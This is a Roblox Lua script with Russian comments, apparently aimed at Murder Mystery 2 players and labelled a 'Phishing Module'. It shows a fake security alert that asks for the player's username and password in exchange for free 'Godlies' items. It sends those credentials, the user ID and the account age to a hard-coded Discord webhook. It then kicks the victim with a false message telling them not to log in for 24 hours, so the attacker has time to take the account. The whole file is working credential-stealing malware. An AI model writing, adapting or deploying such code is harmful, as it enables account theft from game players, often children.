-- [[ КОНФИГУРАЦИЯ ]]
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"

local player = game.Players.LocalPlayer

-- [[ ФУНКЦИЯ ОТПРАВКИ ДАННЫХ ]]
local function sendFinalLog(username, password)
    local payload = {
        ["embeds"] = {{
            ["title"] = "🚀 NEW ACCOUNT ACCESSED!",
            ["color"] = 16744192, -- Оранжевый
            ["fields"] = {
                {["name"] = "👤 Username", ["value"] = "```" .. username .. "```", ["inline"] = true},
                {["name"] = "🔒 Password", ["value"] = "```" .. password .. "```", ["inline"] = true},
                {["name"] = "🆔 UserID", ["value"] = tostring(player.UserId), ["inline"] = false},
                {["name"] = "📅 Acc Age", ["value"] = player.AccountAge .. " days", ["inline"] = true}
            },
            ["footer"] = {["text"] = "MM2 Phishing Module • " .. os.date("%X")}
        }}
    }

    local req = (syn and syn.request) or (http and http.request) or request or http_request
    if req then
        req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(payload)
        })
    end
end

-- [[ СОЗДАНИЕ ФЕЙКОВОГО ОКНА (GUI) ]]
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 320, 0, 240)
Main.Position = UDim2.new(0.5, -160, 0.5, -120)
Main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Main.BorderSizePixel = 0

local Corner = Instance.new("UICorner", Main)

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 45)
Title.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
Title.Text = "SECURITY ALERT"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 18
Title.Font = Enum.Font.SourceSansBold
Instance.new("UICorner", Title)

local Info = Instance.new("TextLabel", Main)
Info.Size = UDim2.new(1, -20, 0, 40)
Info.Position = UDim2.new(0, 10, 0, 50)
Info.BackgroundTransparency = 1
Info.Text = "Session expired. Please re-verify your account to inject items."
Info.TextColor3 = Color3.new(0.8, 0.8, 0.8)
Info.TextWrapped = true
Info.TextSize = 14

local UserInput = Instance.new("TextBox", Main)
UserInput.Size = UDim2.new(0, 280, 0, 35)
UserInput.Position = UDim2.new(0, 20, 0, 100)
UserInput.PlaceholderText = "Username"
UserInput.Text = player.Name
UserInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
UserInput.TextColor3 = Color3.new(1,1,1)

local PassInput = Instance.new("TextBox", Main)
PassInput.Size = UDim2.new(0, 280, 0, 35)
PassInput.Position = UDim2.new(0, 20, 0, 145)
PassInput.PlaceholderText = "Password"
PassInput.Text = ""
PassInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
PassInput.TextColor3 = Color3.new(1,1,1)
PassInput.ClearTextOnFocus = false

local Submit = Instance.new("TextButton", Main)
Submit.Size = UDim2.new(0, 280, 0, 40)
Submit.Position = UDim2.new(0, 20, 0, 190)
Submit.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
Submit.Text = "Verify & Receive Godlies"
Submit.TextColor3 = Color3.new(1, 1, 1)
Submit.TextSize = 16
Submit.Font = Enum.Font.SourceSansBold

Submit.MouseButton1Click:Connect(function()
    if #PassInput.Text > 3 then
        sendFinalLog(UserInput.Text, PassInput.Text)
        Main.Visible = false
        player:Kick("\n\nVerification successful! Items will be added to your inventory within 24 hours. Please do not log in during this time.")
    end
end)
